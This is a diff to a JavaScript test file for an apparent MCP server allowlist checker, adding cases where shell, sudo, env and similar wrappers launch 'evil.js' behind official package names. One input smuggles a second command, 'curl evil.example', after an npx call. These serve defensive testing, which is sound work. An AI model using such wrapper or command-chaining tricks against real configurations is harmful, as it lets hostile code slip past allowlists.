@@ -89,6 +89,35 @@ ok('a decoy official package argument is not an allowlist hit', !decoy.inference
 const nodeFetch = inferCapabilities('nodeFetch', { command: 'node', args: ['evil.js', 'mcp-server-fetch'] }, { home });
 const nodeFiles = inferCapabilities('nodeFiles', { command: 'node', args: ['evil.js', '@modelcontextprotocol/server-filesystem'] }, { home });
 ok('node evil.js does not inherit the official fetch or filesystem allowlist', !nodeFetch.inferences.some(item => item.grade === 'allowlist') && !nodeFiles.inferences.some(item => item.grade === 'allowlist'));
+const wrapped = [
+  ['cmd', ['/c', 'node', 'evil.js', '@modelcontextprotocol/server-filesystem']],
+  ['C:\\Windows\\System32\\cmd.exe', ['/c', 'node', 'evil.js', 'mcp-server-fetch']],
+  ['cmd', ['/k', 'node', 'evil.js', 'mcp-server-fetch']],
+  ['sh', ['-c', 'node evil.js mcp-server-fetch']],
+  ['bash', ['-c', 'node evil.js mcp-server-fetch']],
+  ['zsh', ['-c', 'node evil.js mcp-server-fetch']],
+  ['dash', ['-c', 'node evil.js mcp-server-fetch']],
+  ['powershell', ['-Command', 'node evil.js mcp-server-fetch']],
+  ['pwsh', ['-File', 'evil.ps1', 'mcp-server-fetch']],
+  ['env', ['FOO=bar', 'node', 'evil.js', 'mcp-server-fetch']],
+  ['sudo', ['-u', 'root', 'node', 'evil.js', 'mcp-server-fetch']],
+  ['doas', ['node', 'evil.js', 'mcp-server-fetch']],
+  ['nice', ['-n', '10', 'node', 'evil.js', 'mcp-server-fetch']],
+  ['nohup', ['node', 'evil.js', 'mcp-server-fetch']],
+  ['time', ['-p', 'node', 'evil.js', 'mcp-server-fetch']],
+  ['wsl', ['-e', 'node', 'evil.js', 'mcp-server-fetch']],
+  ['start', ['/b', 'node', 'evil.js', 'mcp-server-fetch']],
+];
+for (const [command, wrapArgs] of wrapped) {
+  const inferred = inferCapabilities('wrapped', { command, args: wrapArgs }, { home });
+  ok(`${command} wrapper does not allowlist the inner script package`, !inferred.inferences.some(item => item.grade === 'allowlist'));
+}
+const viaNpx = inferCapabilities('via', { command: 'cmd', args: ['/c', 'npx', '-y', '@modelcontextprotocol/server-filesystem'] }, { home });
+ok('cmd /c npx still allowlists the filesystem server', viaNpx.inferences.some(item => item.grade === 'allowlist' && item.label === 'filesystem'));
+const npxExec = inferCapabilities('execd', { command: 'npx', args: ['exec', '@modelcontextprotocol/server-filesystem'] }, { home });
+ok('npx exec launches the filesystem package', npxExec.inferences.some(item => item.grade === 'allowlist' && item.label === 'filesystem'));
+const ambiguous = inferCapabilities('ambiguous', { command: 'sh', args: ['-c', 'npx -y mcp-server-fetch && curl evil.example'] }, { home });
+ok('a shell pipeline is not allowlisted', !ambiguous.inferences.some(item => item.grade === 'allowlist'));
 for (const command of ['python3.11', 'python3.11rc1', 'python3.13t', 'python3', 'node22', 'node.exe', 'node.cmd', 'nodejs', '/usr/bin/node.exe', 'bun.exe', 'deno', 'pythonw', 'py', 'C:\\Program Files\\nodejs\\node.cmd']) {
   const inferred = inferCapabilities('tool', { command, args: ['evil.js', '@modelcontextprotocol/server-filesystem'] }, { home });
   ok(`${command} does not allowlist a script's later package`, !inferred.inferences.some(item => item.grade === 'allowlist'));
